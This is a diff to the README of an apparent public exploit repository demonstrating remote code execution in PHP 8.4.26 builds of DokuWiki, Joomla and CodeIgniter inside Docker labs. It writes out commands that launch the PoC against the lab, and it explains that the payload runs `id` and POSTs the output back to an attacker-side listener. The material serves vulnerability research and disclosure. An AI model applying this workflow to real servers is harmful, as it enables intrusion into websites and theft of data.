@@ -54,7 +54,7 @@ application, PHP build, and proof level in that row.
 | 8.4.26 | [DokuWiki](lab/8.4.26/dokuwiki/) | **RCE verified twice** | [Watch](docs/demo/dokuwiki.gif) | [Fresh output](docs/demo/dokuwiki-proof.txt) |
 | 8.4.26 | [Joomla](lab/8.4.26/joomla/) | **RCE verified twice** | [Watch](docs/demo/joomla.gif) | [Fresh output](docs/demo/joomla-proof.txt) |
 | 8.4.26 | [PHP/Apache](lab/8.4.26/php-apache/) | **RCE verified** | [Watch](docs/demo/php-apache.gif) | [Fresh output](docs/demo/php-apache-proof.txt) |
-| 8.4.26 | [CodeIgniter](lab/8.4.26/codeigniter/) | **Callback primitive verified; RCE proof pending** | [Watch](docs/demo/php2shell-codeigniter-live.gif) | [Callback output](docs/demo/php2shell-codeigniter-live-proof.txt) |
+| 8.4.26 | [CodeIgniter](lab/8.4.26/codeigniter/) | **RCE verified** | [Watch](docs/demo/php2shell-codeigniter-live.gif) | [Fresh `id` output](docs/demo/php2shell-codeigniter-live-proof.txt) |
 
 ### WordPress
 
@@ -150,36 +150,47 @@ docker rm -f php2shell-php-apache
 ### CodeIgniter
 
 This fixture uses CodeIgniter appstarter `4.7.4` with framework `4.7.5`. Its
-retained runs show a fresh command-triggered callback because the default
-application has no suitable web-readable writable directory. The callback does
-not include `id` output, so it is not labeled verified RCE.
-
-```bash
-docker compose -f lab/8.4.26/codeigniter/compose.yaml up -d --build
-python3 -u poc.py --url http://127.0.0.1:18087/ --retries 1
-docker compose -f lab/8.4.26/codeigniter/compose.yaml down -v
-```
-
-Record a fresh live run after starting the real lab:
+default application has no suitable web-readable writable directory. The PoC
+executes `id` and POSTs its stdout to its own listener through the lab's short
+Docker network alias `x`. No target-side proof script is installed.
 
 ```bash
 docker compose -f lab/8.4.26/codeigniter/compose.yaml up -d --build
 docker build -f docs/demo/recorder.Dockerfile -t php2shell-vhs-recorder docs/demo
-docker run --rm --network codeigniter_default -p 8000:8000 \
+docker run --rm --network codeigniter_default --network-alias x \
+  -v "$PWD:/vhs" -w /vhs --entrypoint sh php2shell-vhs-recorder \
+  -lc 'socat TCP-LISTEN:18087,bind=127.0.0.1,reuseaddr,fork TCP:codeigniter:80 >/tmp/proxy.log 2>&1 & exec python3 -u poc.py --url http://127.0.0.1:18087/ --retries 1'
+docker compose -f lab/8.4.26/codeigniter/compose.yaml down -v
+```
+
+The PoC command inside the attacker container is
+`python3 -u poc.py --url http://127.0.0.1:18087/ --retries 1`. It requires the
+`x` alias to resolve to that container. A successful run prints fresh `uid=` and
+`gid=` output. Restart the lab with a new Apache master if heap leakage fails;
+the layout is sensitive to ASLR and allocator state. A
+[failed fresh run](docs/evidence/codeigniter-id-run-b.txt) shows that
+pre-execution failure mode.
+
+Record another live run after starting the real lab:
+
+```bash
+docker compose -f lab/8.4.26/codeigniter/compose.yaml up -d --build
+docker build -f docs/demo/recorder.Dockerfile -t php2shell-vhs-recorder docs/demo
+docker run --rm --network codeigniter_default --network-alias x \
   -v "$PWD:/vhs" -w /vhs php2shell-vhs-recorder docs/demo/codeigniter-live.tape
 docker compose -f lab/8.4.26/codeigniter/compose.yaml down -v
 ```
 
-![Live CodeIgniter callback demonstration](docs/demo/php2shell-codeigniter-live.gif)
+![Live CodeIgniter PoC with id output](docs/demo/php2shell-codeigniter-live.gif)
 
 [VHS tape](docs/demo/codeigniter-live.tape) ·
 [MP4](docs/demo/php2shell-codeigniter-live.mp4) ·
 [raw output](docs/demo/php2shell-codeigniter-live-proof.txt) ·
-[recorder image](docs/demo/recorder.Dockerfile)
+[fresh run 1](docs/evidence/codeigniter-id-run-a.txt) ·
+[fresh run 2](docs/evidence/codeigniter-id-run-d.txt) ·
+[fixed-build control](docs/evidence/codeigniter-id-fixed-negative.txt)
 
-This video records the public PoC against the real lab in the same take. It is
-evidence of the narrower callback primitive only. The CodeIgniter heap layout
-also depends on the fresh Apache master's ASLR and allocator state.
+The video records the public PoC against the running lab in the same take.
 
 ## Requirement of the Exploit
 
